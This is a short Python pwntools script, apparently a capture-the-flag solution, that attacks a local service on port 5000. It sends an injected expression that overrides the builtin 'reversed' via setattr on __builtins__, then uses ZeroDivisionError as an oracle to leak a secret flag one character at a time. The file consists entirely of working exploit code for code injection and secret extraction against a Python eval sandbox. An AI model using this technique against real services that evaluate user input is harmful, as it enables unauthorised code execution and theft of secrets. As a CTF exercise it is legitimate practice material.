from string import ascii_letters, digits
from pwn import *

context.log_level = 'error'

space = ascii_letters + digits + '_{}'

flag = ''
while not flag.endswith('}'):
    for c in space:
        t = remote('localhost', 5000)
        t.sendlineafter('> ', f'setattr(__builtins__, "reversed", lambda a: flag[{len(flag)}] == "{c}" or 1/0)')
        output = t.recvall()
        if b'ZeroDivisionError' not in output:
            flag += c
            print(flag)
            break

